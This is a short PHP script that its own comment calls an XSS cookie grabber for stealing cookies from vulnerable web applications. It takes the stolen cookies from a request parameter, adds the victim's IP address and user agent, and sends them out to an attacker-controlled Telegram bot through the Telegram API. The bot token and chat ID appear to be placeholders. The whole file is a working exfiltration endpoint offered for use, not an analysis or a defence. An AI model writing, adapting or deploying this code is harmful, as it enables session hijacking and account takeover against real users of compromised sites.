<?php
	/*
		(XSS) cookie grabber for telegram bot
		This solution is used to steal cookies from vulnerable web applications. The final data is sent to your bot in telegram (see @Botfather).
		2018
	*/
	
	if(!isset($_REQUEST['q']))
		exit();
	
	// Vars
	$g_Cookies = urldecode($_GET['q']);
	$g_IP = $_SERVER['REMOTE_ADDR'];
	$g_UserAgent = $_SERVER['HTTP_USER_AGENT'];
	
	// Telegram settings
	$g_API = '123456789:AAFwz5s3JSPfaaqSSQ5swVJjpBgjY12eSpMh1'; //bot token
	$g_ChatID = '123123123'; //your profile or group
	$g_Message = urlencode("IP: $g_IP | UserAgent: $g_UserAgent | Cookies: $g_Cookies");
	
	//sending a message
	file_get_contents("https://api.telegram.org/bot$g_API/sendMessage?chat_id=$g_ChatID&text=$g_Message");